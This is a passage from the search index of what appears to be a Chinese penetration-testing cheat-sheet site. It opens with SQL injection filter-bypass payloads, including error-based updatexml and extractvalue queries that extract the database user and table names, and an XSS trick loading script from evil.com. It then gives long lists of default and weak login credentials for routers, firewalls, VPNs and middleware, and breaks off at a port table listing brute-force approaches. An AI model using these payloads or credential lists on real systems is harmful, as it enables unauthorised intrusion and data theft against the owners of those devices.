-1\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_10","title":"\u751f\u50fb\u51fd\u6570","text":"<pre><code>MySQL/PostgreSQL\u652f\u6301XML\u51fd\u6570\uff1aSelect UpdateXML(\u2018&lt;script x=_&gt;&lt;/script&gt; \u2019,\u2019/script/@x/\u2019,\u2019src=//evil.com\u2019);\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000\n\n?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))\n\nSELECT xmlelement(name img,xmlattributes(1as src,'a\\l\\x65rt(1)'as \\117n\\x65rror));\u3000//postgresql\n\n?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));\n\nand 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))\n\nand extractvalue(1, concat(0x5c, (select user()),0x5c))\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#n","title":"\\N\u7ed5\u8fc7","text":"<p>\\N\u76f8\u5f53\u4e8eNULL\u5b57\u7b26</p> <pre><code>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0\nselect * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0\nselect * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#pcre","title":"PCRE\u7ed5\u8fc7","text":"<pre><code>PHP \u7684 pcre.backtrack_limit \u9650\u5236\u5229\u7528\nunion/*aaaaaaaxN*/select\n</code></pre> <p>\u4e0a\u9762\u7684\u8fd8\u4e0d\u884c\uff1f\u5c1d\u8bd5\u4fee\u6539\u8bed\u53e5\u903b\u8f91\u518d\u7ed5\u8fc7\u8bd5\u8bd5\uff1f</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%9B%BD%E5%A4%96%E8%B7%AF%E7%94%B1%E5%99%A8%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E9%80%9F%E6%9F%A5%E8%A1%A8/","title":"\u56fd\u5916\u8def\u7531\u5668\u7528\u6237\u540d\u548c\u5bc6\u7801","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%9B%BD%E5%A4%96%E8%B7%AF%E7%94%B1%E5%99%A8%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E9%80%9F%E6%9F%A5%E8%A1%A8/#fbi","title":"\u5b98\u7f51\uff1aFBI","text":"<p>Make Model Username Password  2Wire 1000HG (2Wire Firmware)  2Wire 2700HG-S (2Wire Firmware)  2Wire 2701HG-B (SBC Firmware)  2Wire 2701HG-D (Qwest Firmware)  2Wire 2701HG-G (Bell French Firmware)  2Wire 2701HG-S (Embarq Firmware)  2Wire 2701HG-T (Prodigy Firmware)</p> <p>3COM 3CRWDR101A-75 (3COM Firmware) admin</p> <p>Accton CheetahAccess AC-IG1004 (Accton Firmware)</p> <p>Actiontec GT701 (Actiontec Firmware)  Actiontec GT701 (Qwest Firmware)  Actiontec GT701-WG (Qwest Firmware)  Actiontec GT704WG (Qwest Firmware)  Actiontec GT704WG (Verizon Firmware) admin password  Actiontec M1000 (Qwest Firmware)  Actiontec MI424-WR (Verizon Firmware) admin password1  Actiontec R1520SU (Qwest Firmware)  Actiontec RI408 (Actiontec Firmware) admin password1</p> <p>Airlive Ovislink IP-1000R (Airlive Firmware) admin airlive</p> <p>Airties RT-204 (Airties Firmware)</p> <p>Alice Gate Voip 2 Plus Wi-Fi (Alice Italian Firmware)</p> <p>Ambit U10C019 (Ambit Firmware) admin cableroot  Ambit U10C022 (Ambit Firmware) admin cableroot</p> <p>AOpen AOI-908 (AOpen Firmware) 1234  AOpen AOR-401 (AOpen Firmware) admin 1234</p> <p>Asus AM604 (Asus Firmware) admin admin  Asus WL-520GC (Asus Firmware) admin admin  Asus WL-520GU (Asus Firmware) admin admin  Asus WL-530G (Asus Firmware) admin admin</p> <p>Ativa 54G (Ativa Firmware)</p> <p>Aztech DSL605EW (Aztech Firmware) admin admin</p> <p>Belkin F1PI242EGau (iinet.net.au Firmware) admin  Belkin F5D7230-4 v1 (Belkin Firmware)  Belkin F5D7230-4 v6 (Belkin Firmware)  Belkin F5D7230-4 v9 (Belkin Firmware)  Belkin F5D7231-4 (Belkin Firmware)  Belkin F5D7234-4 v3 (Belkin Firmware)  Belkin F5D7630-4 (Belkin Firmware)  Belkin F5D7632-4 v1 (Belkin Firmware)  Belkin F5D8230-4 (Belkin Firmware)  Belkin F5D8233-4 v1 (Belkin Firmware)  Belkin F5D8233-4 v3 (Belkin Firmware)  Belkin F5D8233-4 v4 (Belkin Firmware)  Belkin F5D8236-4 v1 (Belkin Firmware)  Belkin F5D8631-4 v2 (Belkin Firmware)  Belkin F5D8631-4 v3 (Belkin Firmware)  Belkin G Plus MIMO F5D9230-4 v5 (Belkin Firmware)  Belkin G Plus MIMO F5D9231-4 v1 (Belkin Firmware)  Belkin N1 Vision F5D8632-4 v1 (Belkin Firmware)</p> <p>Billion BiPAC 7500G (Billion Firmware) admin password</p> <p>BT Voyager 2100 (BT Firmware) admin admin  BT Voyager 220v (BT Firmware) admin admin</p> <p>Buffalo WHR-G (Buffalo Japanese Firmware) root  Buffalo WZR2-G300N (Buffalo Firmware) root</p> <p>Canyon CN-WF514 (Canyon Firmware) admin 1234</p> <p>CNet CNAD804-NF (Conexant Firmware) admin epicrouter  CNet CWR-854V (CNet Firmware) root 1234</p> <p>Comtrend CT-5361 (Comtrend Firmware) admin admin</p> <p>Conceptronic C54BRS4 (Conceptronic Firmware) admin 1234</p> <p>Connection N&amp;C RBW54 (Connection N&amp;C Firmware) admin admin</p> <p>D-Link 500G (D-Link Firmware) admin  D-Link DGL-4100 (D-Link Firmware) admin  D-Link DGL-4300 (D-Link Firmware) admin  D-Link DGL-4500 (D-Link Firmware) admin  D-Link DI-524 (D-Link Firmware) admin  D-Link DI-604 (D-Link Firmware) admin  D-Link DI-624 (D-Link Firmware) admin  D-Link DI-635 (D-Link Firmware) admin  D-Link DI-704P (D-Link Firmware) admin  D-Link DI-704UP (D-Link Firmware) admin  D-Link DIR-300 (D-Link Firmware) admin  D-Link DIR-615 (D-Link Firmware) admin  D-Link DIR-625 (D-Link Firmware) admin  D-Link DIR-655 (D-Link Firmware) admin  D-Link DSL-2540T (D-Link Firmware) admin admin  D-Link DSL-2640T (D-Link Firmware) admin admin  D-Link DSL-502G (D-Link Firmware) admin admin  D-Link DSL-504G (D-Link Firmware) admin admin  D-Link DSL-504T (D-Link Firmware) admin admin  D-Link DSL-522T (D-Link Firmware) admin admin  D-Link DSL-524T (D-Link Firmware) admin admin  D-Link DSL-G604T (D-Link Firmware) admin admin  D-Link DSL-G624M (D-Link Firmware) admin admin  D-Link DSL-G624T (D-Link Firmware) admin admin  D-Link DVA-G3340S (D-Link Firmware) admin admin  D-Link EBR-2310 (D-Link Firmware) admin  D-Link G604T (D-Link Firmware) admin  D-Link GLB-502T (D-Link Firmware) admin admin  D-Link WBR-1310 (D-Link Firmware) admin  D-Link WBR-2310 (D-Link Firmware) admin</p> <p>Davolink DV-2020 (Davolink Firmware) user user</p> <p>Digicom Michelangelo Wave (Digicom Firmware) admin admin</p> <p>DD-WRT Firmware v23 &amp; v24 root admin</p> <p>Draytek Vigor2700e (Draytek Firmware) admin admin</p> <p>DSLink 260E (DSLink Firmware) root root</p> <p>Edimax AR-7064 A (Edimax Firmware) admin admin  Edimax AR-7084G A (Edimax Firmware) admin 1234  Edimax BR-6104K (Edimax Firmware) admin 1234  Edimax BR-6104KP (Edimax Firmware) admin 1234  Edimax BR-6204WG (Edimax Firmware) admin 1234  Edimax BR-6216Mg (Edimax Firmware) admin 1234  Edimax BR-6624 (Edimax Firmware) admin</p> <p>ENCORE ENDSL-A2+WIGX2 v1 (ENCORE Firmware) admin trendchip  ENCORE ENHWI-G IEEE 802.11g (Encore Firmware) admin admin</p> <p>Fritz!Box Fon WLAN 7170 (Fritz!Box Firmware)</p> <p>Gnet IP0006 (Gnet Firmware) admin</p> <p>Hamlet HRDSL512W_R (Hamlet Firmware) admin hamlet</p> <p>Hayes 15810 (Hayes Firmware) admin hayesadsl</p> <p>Huawei EchoLife HG510 (Romania Tel Firmware) admin admin  Huawei EchoLife HG520b (TT Firmware) admin admin  Huawei EchoLife HG520s (TT Firmware) admin admin  Huawei SmartAX MT880 (Version E.37 Firmware) admin admin  Huawei SmartAX MT882 (Opal Firmware) admin admin  Huawei SmartAX MT882 (SrpskeTel Firmware) admin admin</p> <p>Iskratel SI2000 Callisto821+ (Iskratel Firmware) admin admin</p> <p>Jnet JN-DS5400 (Jnet Firmware) admin password</p> <p>Kyocera KR2 (Kyocera Firmware) admin</p> <p>Lantech AR-2000 (Conexant Firmware) root root</p> <p>Levelone FBR-1161A (Levelone Firmware) admin admin</p> <p>Linksys AG241 (Linksys Firmware) admin admin  Linksys BEFSR11 (Linksys Firmware) admin  Linksys BEFSR41 (Linksys Firmware) admin  Linksys BEFSR81 (Linksys Firmware) admin  Linksys BEFSRU31 (Linksys Firmware) admin  Linksys BEFSX41 (Linksys Firmware) admin  Linksys BEFW11S4 (Linksys Firmware) admin  Linksys RT31P2 (Linksys Firmware) admin admin  Linksys RV042 (Linksys Firmware) admin admin  Linksys WAG200G (Linksys Portuguese Firmware) admin  Linksys WAG325N (Linksys Firmware) admin admin  Linksys WAG354G (Linksys Firmware) admin  Linksys WRK54G (Linksys Firmware) admin  Linksys WRT100 (Linksys Firmware) admin  Linksys WRT110 (Linksys Firmware) admin  Linksys WRT150N (Linksys Firmware) admin  Linksys WRT160N v2 (Linksys Firmware) admin  Linksys WRT300N (Linksys Firmware) admin  Linksys WRT310N (Linksys Firmware) admin  Linksys WRT350N (Linksys Firmware) admin  Linksys WRT54G (Hyperlite Firmware) admin  Linksys WRT54G (Linksys Firmware) admin  Linksys WRT54G (Satori-4.0 Firmware By Sveasoft) admin  Linksys WRT54G2 (Linksys Firmware) admin  Linksys WRT54GC (Linksys Italian Firmware) admin  Linksys WRT54GL (Linksys Firmware) admin  Linksys WRT54GP2A-AT (Linksys Firmware) admin  Linksys WRT54GS (Linksys Firmware) admin  Linksys WRT54G-TM (Linksys Firmware) admin  Linksys WRT54GX2 (Linksys Firmware) admin  Linksys WRT54GX4 (Linksys Firmware) admin  Linksys WRT610N (Linksys Firmware) admin  Linksys WRTP54G (Linksys Firmware) admin password  Meetus AMT1004 (Meetus Firmware) admin adslnadam</p> <p>Microcom AD 2656 (Microcom Firmware) admin epicrouter</p> <p>Microsoft MN-100 (Microsoft Firmware) admin  Microsoft MN-700 (Microsoft Firmware) admin</p> <p>Motorola VT2542 (Motorola Firmware) router router</p> <p>MSI RG60G (MSI Firmware) admin admin</p> <p>\u56fd\u5916\u8def\u7531\u5668\u7528\u6237\u540d\u548c\u5bc6\u7801(\u9ed8\u8ba4)\uff08\u4e0b\uff09</p> <p>\u56fd\u5916\u8def\u7531\u5668\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u4e0b\uff09  Make Model Username Password  Netcore 2005NR (Netcore Chinese Firmware) guest guest</p> <p>Netgear CG814WG (Optus Firmware) admin password  Netgear DG834 v3 (Netgear Firmware) admin password  Netgear DG834G v2 (Netgear Firmware) admin password  Netgear RP614 v2 (Netgear Firmware) admin password  Netgear RP614 v4 (Netgear Firmware) admin password  Netgear RP614 v4 (Netgear German Firmware) admin password  Netgear WGR614 v5 (Netgear Firmware) admin password  Netgear WGR614 v6 (Netgear Firmware) admin password  Netgear WGR614 v7 (Netgear Firmware) admin password  Netgear WGR614 v8 (Netgear Firmware) admin password  Netgear WGR614 v9 (Netgear Firmware) admin password  Netgear WGT624 v2 (Netgear Firmware) admin password  Netgear WGT624 v3 (Netgear Firmware) admin password  Netgear WGT624 v4 (Netgear Firmware) admin password  Netgear WNDR3300 (NetGear Firmware) admin password  Netgear WNR3500 v2 (NetGear Firmware) admin password  Netgear WNR834B v2 (NetGear Firmware) admin password  Netgear WPN824 v2 (Netgear Firmware) admin password  Netgear WPN824 v3 (Netgear Firmware) admin password  Netgear WPNT834 (NetGear Firmware) admin password</p> <p>Netopia 2241N-VGX (Netopia Firmware)  Netopia 3347NWG-006 (Netopia Firmware)</p> <p>Nexxt Solutions NW230NXT14 (Nexxt Firmware) guest guest</p> <p>Oiwtech oiw-2401apg (Oiwtech Portuguese Firmware) root admin</p> <p>OPEN iConnect Access 611 (OPEN Firmware) root 0P3N  OPEN iConnect Access 624 (OPEN Firmware) root 0P3N</p> <p>Pentagram Cerberus P 6331-42 (Pentagram Firmware) admin admin</p> <p>Pepwave Surf-200 (Pepwave Firmware) admin</p> <p>Pirelli Netgate voip v2 (Pirelli Firmware) user user</p> <p>Planet ADE - 3400 (Planet Firmware) admin epicrouter  Planet ADE - 3410 (Planet Firmware) admin admin  Planet XRT-401D (Planet Firmware) admin 1234</p> <p>Postef 8820U (Postef Firmware) admin admin</p> <p>Prolink H9000 (Prolink Firmware) admin password  Prolink Hurricane 5200 (Prolink Firmware) admin password  Prolink Hurricane 9200AR (Prolink Firmware) admin password  Prolink Hurricane 9200P (Prolink Firmware) admin password  Prolink WGR1004 (Prolink Firmware) admin password</p> <p>QPCOM QP-WR254G (QPCOM Firmware) admin 1234</p> <p>Routertech Firmware v2.8 Firmware Admin Admin</p> <p>Safecom GWART2-54125 (Safecom Firmware) admin admin</p> <p>Sagem F@st 1201 (Sagem Firmware) admin admin  Sagem F@st 3120 (Sagem Firmware) user user  Sagem FST3202 (Livebox English Firmware) admin admin  Sagem FST3202 (Livebox French Firmware) admin admin</p> <p>Sanex SA-5100 (Sanex Firmware) admin admin</p> <p>Shiro DSL805E (Shiro Firmware) admin admin</p> <p>Siemens Gigaset SE260 (Siemens E9 Firmware) user user  Siemens Gigaset SE260 DSL (Siemens Firmware) admin admin  Siemens Gigaset SE261 DSL (Siemens Firmware) admin admin  Siemens Gigaset SE567 (Telus Firmware) admin telus177  Siemens Siemens - Gigaset SX552 (Siemens Firmware) admin</p> <p>Sitecom DC-202 v5 (Sitecom Firmware) admin admin  Sitecom WL-127 (Sitecom Firmware) admin admin  Sitecom WL-154 (Sitecom Firmware) admin admin  Sitecom WL-160 (Sitecom Firmware) admin admin  Sitecom WL-174 (Sitecom Firmware) admin admin  Sitecom WL-308 (Sitecom Firmware) admin admin  Sitecom WL-312 (Sitecom Firmware) admin admin</p> <p>SmartLink SM-4100 (SmartLink Firmware) admin</p> <p>SMC SMC7004VBR (SMC Firmware) smcadmin  SMC SMC7004VWBR (SMC Firmware) admin  SMC SMCWBR14-G2 EU (SMC Firmware) smcadmin  SMC SMCWBR14-N2 (SMC Firmware) Admin smcadmin  SMC SMCWBR14S-N2 (SMC Firmware) Admin smcadmin</p> <p>Sphairon Turbolink-AR860 (Sphairon Firmware) admin admin</p> <p>Sweex LC000070 (Sweex Firmware) admin</p> <p>Telenet TNDSL 2120 (Telenet Firmware) admin admin</p> <p>Telsey CPVA502+ (Telsey Firmware) admin admin</p> <p>Tenda twl 108r (Tenda Firmware) admin admin</p> <p>Thomson Speedtouch 530 (Thomson Firmware) admin admin  Thomson Speedtouch 530 v6 (Thomson Firmware) admin admin  Thomson Speedtouch 546 v6 (Thomson Firmware) admin admin  Thomson TG585 (Thomson Firmware) Administrator</p> <p>Tilgin Vood 453W (Tilgin German Firmware) admin admin</p> <p>Tomato Firmware v1 admin admin</p> <p>TP-Link TD-8810 (TP-LINK Firmware) admin admin  TP-Link TD-8817 (TP-LINK Firmware) admin admin  TP-Link TD-8840 (TP-LINK Firmware) admin admin  TP-Link TD-W8910G (TP-Link Firmware) admin admin  TP-Link TL-R460 (TP-LINK Firmware) admin admin  TP-Link TL-WR541G (TP-LINK Firmware) admin admin</p> <p>Trendnet TEW-432BRP (Trendnet Firmware) admin admin  Trendnet TEW-452BRP (Trendnet Firmware) admin admin  Trendnet TEW-632BRP (Trendnet Firmware) admin admin  Trendnet TW100-S4W1CA (Trendnet Firmware) admin admin</p> <p>Trust MD-4050 (Trust Firmware) admin admin</p> <p>Viettel VT-AD02 (Viettel Firmware) admin admin</p> <p>Westell B90-327W15-06 (Westell Firmware) admin admin</p> <p>U.S. Robotics USR5461 (U.S. Robotics Firmware) admin admin  U.S. Robotics USR9106 (U.S. Robotics Firmware) admin admin  U.S. Robotics USR9108 (U.S. Robotics Firmware) admin admin  U.S. Robotics USR9108A (U.S. Robotics Firmware) admin admin  U.S. Robotics USR9112 (U.S. Robotics Firmware) admin</p> <p>Ubiquiti Nanostation 5 (Ubiquiti Firmware) root admin</p> <p>Utstarcom WA3002G4 (Dataone Firmware) admin admin</p> <p>Zhone 6211-I2-xxx (Zhone Firmware) admin admin</p> <p>Zinwell G220 (Zinwell Firmware) admin admin</p> <p>Zoom X5 Model 5554 (Zoom Firmware) admin zoomadsl</p> <p>ZTE ZXDSL 531B (ZTE Firmware) admin admin</p> <p>ZyXEL NBG-318S (ZyXEL Firmware) 1234  ZyXEL P-2602H-D1A (ZyXEL Firmware) 1234  ZyXEL P-2602R-D1A (ZyXEL Firmware) 1234  ZyXEL P-660H-T1 v2 (ZyXEL Firmware) 1234  ZyXEL P-660HW-D1 (ZyXEL Firmware) 1234  ZyXEL P-660HW-T1 (ZyXEL Firmware) 1234  ZyXEL P-660R-61C (ZyXEL Firmware) 1234  ZyXEL P-660R-D1 (ZyXEL Firmware) 1234  ZyXEL P-660R-T1 (ZyXEL Firmware) 1234  ZyXEL P-660R-T1 v2 (ZyXEL Firmware) 1234  ZyXEL P660HTW2 (ZyXEL Firmware) 1234  ZyXEL P660RT2 (ZyXEL Firmware) 1234</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/","title":"\u5f31\u53e3\u4ee4","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/#vpn","title":"\u5b89\u5168\u8bbe\u5907&amp;VPN\u5f31\u53e3\u4ee4","text":"\u8bbe\u5907 \u9ed8\u8ba4\u8d26\u53f7 \u9ed8\u8ba4\u5bc6\u7801 \u6df1\u4fe1\u670d\u4ea7\u54c1 sangfor sangfor  sangfor@2018sangfor@2019 \u6df1\u4fe1\u670d\u79d1\u6280\u2002AD delanrecover \u6df1\u4fe1\u670d\u8d1f\u8f7d\u5747\u8861 AD 3.6 admin admin \u6df1\u4fe1\u670dWAC ( WNS  V2.6) admin admin \u6df1\u4fe1\u670dAC6.0 admin admin SANGFOR\u9632\u706b\u5899 admin sangfor \u6df1\u4fe1\u670dAF(NGAF  V2.2) admin sangfor \u6df1\u4fe1\u670dNGAF\u4e0b\u4e00\u4ee3\u5e94\u7528\u9632\u706b\u5899(NGAF  V4.3) admin admin \u6df1\u4fe1\u670dAD3.9 admin admin \u6df1\u4fe1\u670d\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u8bbe\u5907\u6570\u636e\u4e2d\u5fc3 Admin \u5bc6\u7801\u4e3a\u7a7a SANGFOR_AD_v5.1 admin admin \u7f51\u5fa1\u6f0f\u6d1e\u626b\u63cf\u7cfb\u7edf leadsec leadsec \u5929\u9617\u5165\u4fb5\u68c0\u6d4b\u4e0e\u7ba1\u7406\u7cfb\u7edf  V7.0 Admin venus70 Audit venus70 adm venus70 \u5929\u9617\u5165\u4fb5\u68c0\u6d4b\u4e0e\u7ba1\u7406\u7cfb\u7edf  V6.0 Admin venus60 Audit venus60 adm venus60 \u7f51\u5fa1WAF\u96c6\u4e2d\u63a7\u5236\u4e2d\u5fc3(V3.0R5.0) admin leadsec.waf audit leadsec.waf adm leadsec.waf \u8054\u60f3\u7f51\u5fa1 administrator administrator \u7f51\u5fa1\u4e8b\u4ef6\u670d\u52a1\u5668 admin admin123 \u8054\u60f3\u7f51\u5fa1\u9632\u706b\u5899PowerV administrator administrator \u8054\u60f3\u7f51\u5fa1\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf lenovo default \u8054\u60f3\u7f51\u5fa1\u9632\u706b\u5899 admin leadsec@7766 admin administrator admin bane@7766 \u7f51\u7edc\u536b\u58eb\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf admin talent \u7f51\u5fa1\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edfV3.2.72.0 adm leadsec32 admin leadsec32 \u8054\u60f3\u7f51\u5fa1\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edfIDS root 111111 admin admin123 \u79d1\u6765\u7f51\u7edc\u56de\u6eaf\u5206\u6790\u7cfb\u7edf csadmin colasoft \u4e2d\u63a7\u8003\u52e4\u673aweb3.0 administrator 123456 H3C iMC admin admin H3C SecPath\u7cfb\u5217 admin admin H3C S5120-SI test 123 H3C\u667a\u80fd\u7ba1\u7406\u4e2d\u5fc3 admin admin H3C ER3100 admin adminer3100 H3C ER3200 admin adminer3200 H3C ER3260 admin adminer3260 H3C admin adminer admin admin h3c h3c H3C web\u7f51\u7ba1\u7528\u6237\u767b\u5f55 admin h3capadmin 360\u5929\u64ce admin admin \u7f51\u795e\u9632\u706b\u5899 firewall firewall \u5929\u878d\u4fe1\u9632\u706b\u5899NGFW4000 superman talent \u5929\u878d\u4fe1\u9632\u706b\u5899 superman talent\uff0123 \u9ed1\u76fe\u9632\u706b\u5899 admin admin rule abc123 audit abc123 \u534e\u4e3a\u9632\u706b\u5899 telnetuser telnetpwd ftpuser ftppwd admin Admin@123 eudemon eudemon \u65b9\u6b63\u9632\u706b\u5899 admin admin \u98de\u5854\u9632\u706b\u5899 admin \u5bc6\u7801\u4e3a\u7a7a Juniper_SSG__5\u9632\u706b\u5899 netscreen netscreen \u4e2d\u65b0\u91d1\u76fe\u786c\u4ef6\u9632\u706b\u5899 admin 123 kill\u9632\u706b\u5899(\u51a0\u7fa4\u91d1\u8fb0) admin sys123 \u5929\u6e05\u6c49\u9a6cUSG\u9632\u706b\u5899 admin venus.fw Audit venus.audit useradmin venus.user \u963f\u59c6\u745e\u7279\u9632\u706b\u5899 admin manager \u5c71\u77f3\u7f51\u79d1 hillstone hillstone \u7eff\u76df\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf weboper weboper webaudit webaudit conadmin conadmin admin admin shell shell \u7eff\u76df\u4ea7\u54c1 nsfocus123 admin nsfocus reporter nsfocus auditor nsfocus TopAudit\u65e5\u5fd7\u5ba1\u8ba1\u7cfb\u7edf superman talent LogBase\u65e5\u5fd7\u7ba1\u7406\u7efc\u5408\u5ba1\u8ba1\u7cfb\u7edf admin safetybase \u7f51\u795eSecFox\u8fd0\u7ef4\u5b89\u5168\u7ba1\u7406\u4e0e\u5ba1\u8ba1\u7cfb\u7edf admin !1fw@2soc#3vpn \u7f51\u795e\u9632\u706b\u5899GE1\u53e3 admin firewall \u5929\u878d\u4fe1\u6570\u636e\u5e93\u5ba1\u8ba1\u7cfb\u7edf superman telent Hillstone\u5b89\u5168\u5ba1\u8ba1\u5e73\u53f0 hillstone hillstone \u7f51\u5eb7\u65e5\u5fd7\u4e2d\u5fc3 ns25000 ns25000 \u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\uff08\u4e2d\u79d1\u65b0\u4e1a\uff09 admin 123456 \u5929\u73a5\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf Admin cyberaudit \u660e\u5fa1WEB\u5e94\u7528\u9632\u706b\u5899 admin admin admin adminadmin \u660e\u5fa1\u653b\u9632\u5b9e\u9a8c\u5ba4\u5e73\u53f0 root 123456 \u660e\u5fa1\u5b89\u5168\u7f51\u5173 admin adminadmin \u660e\u5fa1\u8fd0\u7ef4\u5ba1\u8ba1\u4e0e\u518c\u98ce\u9669\u63a7\u5236\u7cfb\u7edf admin 1q2w3e system 1q2w3e4r auditor 1q2w3e4r operator 1q2w3e4r \u660e\u5fa1\u7f51\u7ad9\u536b\u58eb sysmanager sysmanager888 \u660e\u5fa1APT admin Dbapp@2014 \u4ebf\u90ae\u90ae\u4ef6\u7f51\u5173 eyouuser eyou_admin eyougw admin@(eyou) admin +-ccccc admin cyouadmin Websense\u90ae\u4ef6\u5b89\u5168\u7f51\u5173 administrator admin \u68ad\u5b50\u9c7c\u90ae\u4ef6\u5b58\u50a8\u7f51\u5173 admin admin \u5929\u6e05web\u5e94\u7528\u5b89\u5168\u7f51\u5173 admin venus70 \u5929\u5883\u626b\u63cf\u5668 admin venustech60 \u5929\u6e05\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf admin venus.nips \u8fb0\u6cf0\u548c\u4fe1\u606f\u5b89\u5168\u8fd0\u8425\u4e2d\u5fc3 sysadmin/\u7cfb\u7edf\u7ba1\u7406\u5458 venus.sysadmin useradmin/\u7528\u6237\u7ba1\u7406\u5458 venus.useradmin auditor/\u5ba1\u8ba1\u7ba1\u7406\u5458 venus.auditor \u542f\u660e\u661f\u8fb0 admin bane@7766 admin admin@123 juniper netscreen netscreen Cisco admin cisco \u8fea\u666e admin admin_default \u9f50\u6cbb\u5821\u5792\u673a shterm shterm \u7ef4\u76df\u8def\u7531\u5668 admin admin root admin \u94f1\u8baf Yxlink WAF sysadmin sysadmin IBM IMM \u96c6\u6210\u7ba1\u7406\u6a21\u5757 USERID PASSW0RD \u5927\u534e\u76d1\u63a7\u8bbe\u5907 admin admin \u9510\u6377NBR\u7cfb\u5217 manager manager \u534e\u590f\u521b\u65b0AppEx\u3001Lotware\u3001LotWan\u3001LotFlow\u3001LotAccess\u3001LotBalance\u3001LotMobile\u4ee5\u53ca\u534e\u521b\u8def\u7531\u5668 admin admin \u6df1\u4fe1\u670dVPN Admin Admin \u6df1\u4fe1\u670dipsec-VPN  (SSL 5.5) Admin Admin \u5929\u878d\u4fe1VPN test 123456 \u534e\u4e3aVPN root mduadmin"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/#_2","title":"\u8def\u7531\u5668\u5f31\u53e3\u4ee4","text":"\u8bbe\u5907 \u9ed8\u8ba4\u8d26\u53f7 \u9ed8\u8ba4\u5bc6\u7801 \u5168\u5411QL1680 admin qxcommsupport qxcomm1680 qxcomm1680 \u5168\u5411QL1880 root root \u5168\u5411QL1688 admin qxcomm1688 \u9ad8\u7aef\u8bbe\u7f6e\u5bc6\u7801\uff1a qxcommsuport TP-LINKTD-8800 admin admin. \u5408\u52e4zyxel642 telnet 1234 EcomED-802EG root root \u795e\u5dde\u6570\u78016010RA ADSL ADSL1234 \u534e\u4e3aSmartAXMT800 admin admin \u4f0a\u6cf0\u514b supervisor 12345 \u534e\u7855 adsl adsl1234 \u540c\u7ef4DSL699E ROOT ROOT \u5927\u4e9aDB102 admin dare WST\u7684RT1080 root root WST\u7684ART18C admin conexant \u5b9e\u8fbeADSL2110-EH admin starnetadsl \u6cdb\u5fb7\u7528\u6237 admin conexant \u4e1c\u4fe1Ea700 \u7a7a password broadmax\u7684hsa300a broadmax broadmax \u957f\u8679ch-500E root root \u91cd\u5e86\u666e\u5929CPADSL03 root root \u53f0\u6e7e\u7a81\u7834EA110RS232:38400 SL SL etek-td\u7684ADSL_T07L006.0 supervisor 12345 GVC\u7684DSL-802E/R3A admin epicrouter \u79d1\u8fc8\u6613\u901akm300A-1 password \u79d1\u8fc8\u6613\u901akm300A-G root root \u6613\u901akm300A-A rootoradmin 123456 sunrise\u7684SR-DSL-AE admin 0000 sunrise\u7684DSL-802E_R3A admin epicrouter UTStar\u7684ut-300 admin utstar \u6e56\u5317\u90ae\u901a admin epicrouter \u4ea8\u5a01NSM500\u7f51\u901f\u901a root root \u827e\u739b701g admin admin \u827e\u739b701H admin epicrouter \u5b9e\u8fbe2110EHROUTER user password \u795e\u5dde\u6570\u7801/\u534e\u7855 adsl adsl1234 \u5168\u5411 root root \u666e\u5929 admin dare zyxel anonymous 1234 e-tek admin 12345 \u5317\u7535 anonymous 12345 \u5927\u6052 admin admin \u5927\u5510 admin 1234 \u65af\u5a01\u7279 root root user user \u4e2d\u5174 adsl adsl831"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E4%BA%A7%E5%93%81%E5%BC%B1%E5%8F%A3%E4%BB%A4/#_3","title":"\u4e2d\u95f4\u4ef6\u5f31\u53e3\u4ee4","text":"\u8bbe\u5907 \u9ed8\u8ba4\u8d26\u53f7 \u9ed8\u8ba4\u5bc6\u7801 tomcat tomcat tomcat weblogic weblogic weblogic system system portaladmin portaladmin guest guest weblogic admin123 weblogic weblogic123 Jboss jboss jboss admin admin jonas jadmin jonas tomcat tomcat jonas jonas"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/","title":"\u5e38\u89c1\u7aef\u53e3","text":"\u7aef\u53e3\u53f7 \u7aef\u53e3\u8bf4\u660e \u6e17\u900f\u601d\u8def 21/69 FTP/TFTP\uff1a\u6587\u4ef6\u4f20\u8f93\u534f\u8bae \u7206\u7834\u3001\u5185\u7f51\u55c5\u63a2 22 